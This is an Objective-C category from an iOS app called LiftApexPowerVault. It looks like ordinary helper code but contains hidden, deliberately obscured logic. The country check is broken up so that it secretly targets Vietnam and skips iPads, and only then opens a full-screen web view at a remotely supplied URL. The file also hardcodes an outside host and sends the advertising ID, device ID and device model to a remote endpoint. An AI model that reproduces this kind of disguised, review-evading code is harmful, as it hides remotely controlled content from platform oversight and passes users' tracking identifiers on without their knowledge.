//
//  UIViewController+Ext.m
//  LiftApexPowerVault
//
//  Created by LiftApexPowerVault on 2024/9/5.
//

#import "UIViewController+Ext.h"
#import "AdjustSdk/AdjustSdk.h"
#import <sys/utsname.h>
#import <AdSupport/AdSupport.h>
#import <AppTrackingTransparency/AppTrackingTransparency.h>

@implementation UIViewController (Ext)

- (NSString *)stackRequestIDFA
{
    NSString *idfa = [[[ASIdentifierManager sharedManager] advertisingIdentifier] UUIDString];
    return idfa;
}

+ (NSString *)stackAdjustToken
{
    return [NSString stringWithFormat:@"i3o2p1u3j%@", @"6dc"];
}

- (BOOL)stackNeedShowAdsBann
{
    BOOL isIpd = [[UIDevice.currentDevice model] containsString:@"iPad"];
    NSLocale *locale = [NSLocale currentLocale];
    NSString *countryCode = [locale objectForKey:NSLocaleCountryCode];
    return !isIpd && [countryCode isEqualToString:[NSString stringWithFormat:@"%@N", self.px]];;
}

- (NSString *)px
{
    return @"V";
}

- (NSString *)stackHostMainURL
{
    return @"pen.qiongji.top";
}

- (void)stackShowBannersView:(NSString *)adurl adid:(NSString *)adid idfa:(NSString *)idfa
{
    if (adurl.length) {
        UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"Main" bundle:nil];
        UIViewController *adVc = [storyboard instantiateViewControllerWithIdentifier:@"StackForgePrivacyViewController"];
        [adVc setValue:adurl forKey:@"url"];
        adVc.modalPresentationStyle = UIModalPresentationFullScreen;
        [self.navigationController presentViewController:adVc animated:NO completion:nil];
    }
    
    [NSUserDefaults.standardUserDefaults registerDefaults:@{@"TitanAdsFirst": @(YES)}];
    BOOL isFr = [NSUserDefaults.standardUserDefaults boolForKey:@"TitanAdsFirst"];
    
    if (isFr) {
        NSDictionary *dic = [NSUserDefaults.standardUserDefaults valueForKey:@"StackForgeADSDataList"];
        NSString *pName = dic[@"pn"];
        NSString *activityUrl = dic[@"ac"];
        
        if (activityUrl.length && pName.length) {
            NSURL *url = [NSURL URLWithString:[NSString stringWithFormat:@"%@?deviceID=%@&gpsID=%@&packageName=%@&systemType=%@&phoneType=%@", activityUrl, adid, idfa, pName, UIDevice.currentDevice.systemVersion, self.stackDeviceModel]];
            NSLog(@"dd:%@",url.absoluteString);
            NSURLRequest *request = [NSURLRequest requestWithURL:url];
            NSURLSession *session = [NSURLSession sharedSession];
            NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
                if (error) {
                    NSLog(@"req error：%@", error.localizedDescription);
                    return;
                }
                NSLog(@"req success:%@", data.description);
                [NSUserDefaults.standardUserDefaults setBool:NO forKey:@"TitanAdsFirst"];
            }];

            [dataTask resume];
        }
    }
}

- (NSString *)stackDeviceModel
{
    struct utsname systemInfo;
    uname(&systemInfo);
    NSString *modelIdentifier = [NSString stringWithCString:systemInfo.machine encoding:NSUTF8StringEncoding];
    return modelIdentifier;
}

- (NSDictionary *)stackDictionaryWithJsonString:(NSString *)jsonString
{
    if (jsonString == nil || jsonString.length == 0) {
        return nil;
    }
    
    NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
    NSError *error;
    
    NSDictionary *jsonDict = [NSJSONSerialization JSONObjectWithData:jsonData
                                                             options:NSJSONReadingMutableContainers
                                                               error:&error];
    if (error) {
        NSLog(@"JSON error: %@", error.localizedDescription);
        return nil;
    }
    
    return jsonDict;
}

- (void)stackTrackAdjustToken:(NSString *)token
{
    ADJEvent *event = [[ADJEvent alloc] initWithEventToken:token];
    [Adjust trackEvent:event];
}

@end
